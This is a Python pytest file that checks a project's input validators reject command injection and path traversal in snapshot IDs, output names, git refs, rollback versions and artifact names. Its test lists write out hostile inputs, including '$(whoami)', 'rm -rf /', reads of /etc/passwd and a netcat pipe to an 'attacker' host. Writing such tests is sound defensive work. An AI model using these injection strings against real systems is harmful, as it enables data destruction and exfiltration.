"""Tests for security-critical validation - P0.

TDD: Write failing tests first, then implement.
"""

import pytest

from goldfish.errors import GoldfishError


class TestSnapshotIdValidation:
    """Tests for snapshot_id validation - prevents git command injection."""

    def test_valid_snapshot_id_passes(self):
        """Valid snapshot IDs should pass."""
        from goldfish.validation import validate_snapshot_id

        # Standard format: snap-{7-8 hex chars}-{YYYYMMDD}-{HHMMSS}
        validate_snapshot_id("snap-a1b2c3d-20251205-143000")
        validate_snapshot_id("snap-abcdef12-20251205-143000")
        validate_snapshot_id("snap-1234567-20240101-000000")

    def test_rejects_command_injection_attempts(self):
        """Should reject command injection attempts."""
        from goldfish.validation import InvalidSnapshotIdError, validate_snapshot_id

        injection_attempts = [
            "$(whoami)",
            "`whoami`",
            "snap-abc; rm -rf /",
            "snap-abc && cat /etc/passwd",
            "snap-abc | cat /etc/passwd",
            "../../../etc/passwd",
            "snap-abc\n rm -rf /",
            "snap-abc\t&&\twhoami",
        ]

        for attempt in injection_attempts:
            with pytest.raises(InvalidSnapshotIdError):
                validate_snapshot_id(attempt)

    def test_rejects_malformed_snapshot_ids(self):
        """Should reject malformed snapshot IDs."""
        from goldfish.validation import InvalidSnapshotIdError, validate_snapshot_id

        invalid_ids = [
            "",  # Empty
            "snap",  # Too short
            "snap-",  # Missing hash
            "snap-abc",  # Missing timestamp
            "snap-abc-20251205",  # Missing time
            "snap-ABCDEF1-20251205-143000",  # Uppercase (should be lowercase hex)
            "snap-ghijkl1-20251205-143000",  # Non-hex chars
            "snap-abc123-2025-12-05-14:30",  # Wrong date format (with colons)
            "snapshot-abc1234-20251205-143000",  # Wrong prefix
            "main",  # Git ref, not snapshot
            "HEAD",  # Git ref
            "refs/heads/main",  # Git ref path
            "snap-12345-20251205-143000",  # Hash too short (5 chars)
            "snap-123456789-20251205-143000",  # Hash too long (9 chars)
        ]

        for invalid_id in invalid_ids:
            with pytest.raises(InvalidSnapshotIdError):
                validate_snapshot_id(invalid_id)

    def test_error_message_is_helpful(self):
        """Error message should explain the issue."""
        from goldfish.validation import InvalidSnapshotIdError, validate_snapshot_id

        with pytest.raises(InvalidSnapshotIdError) as exc_info:
            validate_snapshot_id("invalid")

        assert "snapshot" in str(exc_info.value).lower()


class TestOutputNameValidation:
    """Tests for output_name validation - prevents path traversal."""

    def test_valid_output_names_pass(self):
        """Valid output names should pass."""
        from goldfish.validation import validate_output_name

        valid_names = [
            "model",
            "checkpoint",
            "results",
            "output_v1",
            "final-model",
            "preprocessed_data",
            "model_2024",
        ]

        for name in valid_names:
            validate_output_name(name)

    def test_rejects_path_traversal_attempts(self):
        """Should reject path traversal attempts."""
        from goldfish.validation import InvalidOutputNameError, validate_output_name

        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "foo/../bar",
            "/etc/passwd",
            "\\windows\\system32",
            "output/../../sensitive",
            "foo/bar",  # No slashes allowed
            "foo\\bar",  # No backslashes allowed
        ]

        for attempt in traversal_attempts:
            with pytest.raises(InvalidOutputNameError):
                validate_output_name(attempt)

    def test_rejects_command_injection_attempts(self):
        """Should reject command injection in output names."""
        from goldfish.validation import InvalidOutputNameError, validate_output_name

        injection_attempts = [
            "$(whoami)",
            "`id`",
            "output; rm -rf /",
            "output && cat /etc/passwd",
            "output | nc attacker 1234",
        ]

        for attempt in injection_attempts:
            with pytest.raises(InvalidOutputNameError):
                validate_output_name(attempt)

    def test_rejects_too_long_names(self):
        """Should reject names exceeding max length."""
        from goldfish.validation import InvalidOutputNameError, validate_output_name

        # 65 chars should fail (max is 64)
        too_long = "a" * 65
        with pytest.raises(InvalidOutputNameError):
            validate_output_name(too_long)

        # 64 chars should pass
        max_length = "a" * 64
        validate_output_name(max_length)

    def test_rejects_empty_name(self):
        """Should reject empty output name."""
        from goldfish.validation import InvalidOutputNameError, validate_output_name

        with pytest.raises(InvalidOutputNameError):
            validate_output_name("")


class TestFromRefValidation:
    """Tests for from_ref validation - prevents git ref injection."""

    def test_valid_refs_pass(self):
        """Whitelisted refs should pass."""
        from goldfish.validation import validate_from_ref

        # Whitelisted refs
        validate_from_ref("main")
        validate_from_ref("master")
        validate_from_ref("HEAD")

    def test_valid_workspace_names_as_refs_pass(self):
        """Valid workspace names should be accepted as refs."""
        from goldfish.validation import validate_from_ref

        # Can branch from another workspace
        validate_from_ref("fix-tbpe")
        validate_from_ref("feature_v2")
        validate_from_ref("experiment123")

    def test_rejects_dangerous_refs(self):
        """Should reject dangerous ref patterns."""
        from goldfish.validation import InvalidRefNameError, validate_from_ref

        dangerous_refs = [
            "../../../etc/passwd",
            "refs/heads/; rm -rf /",
            "main; whoami",
            "$(cat /etc/passwd)",
            "`id`",
            "refs/remotes/origin/main",  # Remote refs not allowed
        ]

        for ref in dangerous_refs:
            with pytest.raises(InvalidRefNameError):
                validate_from_ref(ref)


class TestRollbackUsesValidation:
    """Tests that rollback() uses version validation."""

    def test_rollback_validates_version(self, temp_dir):
        """rollback() should validate version format before looking up in database."""
        from unittest.mock import MagicMock

        from goldfish import server
        from goldfish.validation import InvalidVersionError

        mock_config = MagicMock()
        mock_config.audit.min_reason_length = 15
        mock_config.slots = ["w1", "w2", "w3"]

        server.configure_server(
            project_root=temp_dir,
            config=mock_config,
            db=MagicMock(),
            workspace_manager=MagicMock(),
            state_manager=MagicMock(),
            job_launcher=MagicMock(),
            job_tracker=MagicMock(),
            pipeline_manager=MagicMock(),
            dataset_registry=MagicMock(),
            stage_executor=MagicMock(),
            pipeline_executor=MagicMock(),
        )

        try:
            rollback_fn = server.rollback.fn if hasattr(server.rollback, "fn") else server.rollback

            # Should raise validation error for invalid version (command injection attempt)
            with pytest.raises((InvalidVersionError, GoldfishError)):
                rollback_fn(
                    slot="w1",
                    version="$(whoami)",  # Injection attempt - not a valid version format
                    reason="Testing validation works correctly",
                )
        finally:
            server.reset_server()


class TestPromoteArtifactUsesValidation:
    """Tests that promote_artifact() uses output_name validation."""

    def test_promote_artifact_validates_output_name(self, temp_dir):
        """promote_artifact() should validate output_name."""
        from unittest.mock import MagicMock

        from goldfish import server
        from goldfish.validation import InvalidOutputNameError

        mock_config = MagicMock()
        mock_config.audit.min_reason_length = 15

        mock_db = MagicMock()
        mock_db.get_job.return_value = {
            "id": "job-123",
            "status": "completed",
            "artifact_uri": "gs://bucket/artifacts/job-123/",
        }

        server.configure_server(
            project_root=temp_dir,
            config=mock_config,
            db=mock_db,
            workspace_manager=MagicMock(),
            state_manager=MagicMock(),
            job_launcher=MagicMock(),
            job_tracker=MagicMock(),
            pipeline_manager=MagicMock(),
            dataset_registry=MagicMock(),
            stage_executor=MagicMock(),
            pipeline_executor=MagicMock(),
        )

        try:
            promote_fn = (
                server.promote_artifact.fn if hasattr(server.promote_artifact, "fn") else server.promote_artifact
            )

            # Should raise validation error for path traversal
            with pytest.raises((InvalidOutputNameError, GoldfishError)):
                promote_fn(
                    job_id="job-a1b2c3d4",
                    output_name="../../etc/passwd",  # Path traversal attempt
                    source_name="valid_source",
                    metadata={
                        "schema_version": 1,
                        "description": "Model artifact JSON file for validation tests.",
                        "source": {
                            "format": "file",
                            "size_bytes": 123,
                            "created_at": "2025-12-24T12:00:00Z",
                        },
                        "schema": {"kind": "file", "content_type": "application/json"},
                    },
                    reason="Testing validation works correctly",
                )
        finally:
            server.reset_server()
